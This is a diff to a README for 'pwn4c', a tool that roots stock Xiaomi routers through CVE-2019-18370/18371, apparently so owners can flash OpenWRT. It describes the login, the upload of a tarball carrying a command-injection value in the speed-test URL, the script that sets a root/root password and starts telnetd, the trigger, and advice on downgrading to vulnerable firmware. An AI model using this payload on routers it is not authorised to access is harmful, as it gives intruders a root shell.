@@ -36,6 +36,11 @@ go build -ldflags="-s -w" -o pwn4c .
 sudo cp pwn4c /usr/local/bin/
 ```
 
+The repository vendors `internal/exploit/assets/busybox-mipsel`, which is
+compiled into the CLI with `//go:embed`. If your source checkout is missing
+that file, place a compatible statically linked MIPSel BusyBox binary at
+`internal/exploit/assets/busybox-mipsel` before building.
+
 **Option 2: Download pre-built binary**
 
 Download the appropriate binary from the [GitHub Releases](https://github.com/3lyly0/Pwn4C/releases) page:
@@ -62,16 +67,18 @@ Connect the Host to any LAN port on the stock Xiaomi router. The router's defaul
 pwn4c infect 192.168.31.1
 ```
 
-You will be prompted for the router admin password. What `infect` does, stage by stage (Go port of [OpenWRTInvasion](https://github.com/acecilia/OpenWRTInvasion), CVE-2019-18370/18371):
+You will be prompted for the router admin password. What `infect` does, stage by stage (CVE-2019-18370/18371):
 
 1. **Scrape + authenticate** — GETs `/cgi-bin/luci/web`, extracts `deviceId` (MAC) and `key`, derives the `nonce`/`sha1` login hash, and POSTs to `api/xqsystem/login` to obtain the session token (`stok`).
-2. **File server** — starts a local TCP server on a random port. When the router asks for `busybox-mipsel`, the Host fetches it from upstream GitHub and streams it back (requires Host internet access).
-3. **Build payload** — builds a `tar.gz` in memory containing:
+2. **Build payload** — builds a `tar.gz` in memory containing:
    - `speedtest_urls.xml`: a copy of the stock speedtest list, but the `class type="2"` URL is replaced with `http://<router-ip> -q -O /dev/null;((sh /tmp/script.sh exploit) &);exit;wget ...` — command injection executed when the router runs its speed test.
-   - `script.sh`: sets `root/root` password, pulls `busybox-mipsel` from the Host via `nc $REMOTE_ADDR $QUERY_STRING`, and starts `telnetd`.
-4. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
-5. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, and the injected shell connects back to the Host file server (CGI vars `REMOTE_ADDR`/`QUERY_STRING` carry the Host IP/port).
-6. **Verify** — waits ~10s, then probes ports 23/22. Open = root shell ready (`root`/`root`).
+   - `script.sh`: sets the `root/root` password, makes the extracted BusyBox executable, starts `telnetd`, and also tries the stock Dropbear init script.
+   - `busybox`: the MIPSel BusyBox binary is **embedded in the tarball** (vendored in `internal/exploit/assets/busybox-mipsel` and compiled into the Go binary). After extraction it is already at `/tmp/busybox`.
+3. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
+4. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, and the injected shell starts `/tmp/busybox telnetd`.
+5. **Verify** — waits ~10s, then probes ports 23/22. Open = root shell ready (`root`/`root`).
+
+No router internet access is needed, and no inbound connection to the host is required for the shell stage. With `--flash`, the host starts a local TCP server only to serve the sysupgrade image; the shell itself still comes from the embedded BusyBox.
 
 Expected output (success):
 
@@ -82,16 +89,18 @@ Expected output (success):
 [*] 2. Authenticating against router API...
 [+] Session Token (stok) acquired: <redacted-32-hex-chars>
 [*] 3. Detected Host PC Local IP: 192.168.31.74
-[*] 4. Local TCP Server listening on port 34803
-[*] 5. Building V8 Payload (Python-Requests Mimicry)...
-    -> payload size=1031 sha256=46aa0c92...
+[*] 4. No local TCP server needed: busybox is embedded in the payload
+[*] 5. Building air-gapped payload (embedded busybox-mipsel)...
+    -> payload size=<compressed-size> sha256=...
 [*] 6. Uploading tarball to router (Raw HTTP POST)...
     -> Archive accepted successfully (code 0)!
 [*] 7. Triggering command injection...
-[*] Waiting 10 seconds for router to connect back...
+[*] Waiting 10 seconds for the router to extract the payload and start telnetd...
 
-[+] Done! You can now run: telnet 192.168.31.1 (user: root, password: root)
-[+] Infection complete. Router is accessible via SSH.
+[+] Done! Root shell is ready on 192.168.31.1
+    telnet 192.168.31.1          (user: root, password: root)
+    ssh root@192.168.31.1       (password: root)
+[+] Infection complete.
 ```
 
 > **Note on `code 1629`:** some firmware (e.g. Global `3.0.23`) answers the upload with `{"code":1629,"msg":"解压失败..."}` **and still extracts + executes the payload**. `infect` therefore treats a non-zero upload code as a warning, continues to the trigger stage, and lets the port check decide. Only if ports 23/22 stay closed is the run reported as failed (usually: patched firmware — see below). Details in [troubleshooting.md](troubleshooting.md#router-rejected-archive-code1629-解压失败可能文件已经损坏).
@@ -135,7 +144,7 @@ sudo ip link set eth0 up
 | `unable to extract deviceId/key` | Router web page unreachable or changed layout | Check LAN link/IP; the router must serve `/cgi-bin/luci/web` |
 | `login rejected` | Wrong admin password | Re-enter the password set in the Xiaomi admin panel |
 | `upload code=1629` + ports closed | Patched firmware (e.g. China `2.14.502` rejects all archives) | Downgrade to a vulnerable build (`2.14.75`–`2.14.92`, Global `3.0.23`), or use Path B |
-| `telnet (23) and ssh (22) are both closed` | Injection did not execute (patched/slow target) | Retry once; try `telnet 192.168.31.1` manually; if persistent, use Path B |
+| `telnet (23) and ssh (22) are both closed` | Injection did not execute, wrong admin password, or LAN/host firewall issue | Retry once; check the password; try `telnet 192.168.31.1` manually; confirm the host is on the router's LAN (not WAN) and has no firewall blocking outbound LAN traffic; if persistent, use Path B |
 | `mtd write failed` | Insufficient `/tmp` space or flash write error | Reboot router to stock, retry. If persistent, use UART |
 
 See [troubleshooting.md](troubleshooting.md#exploit-failures) for detailed diagnosis.
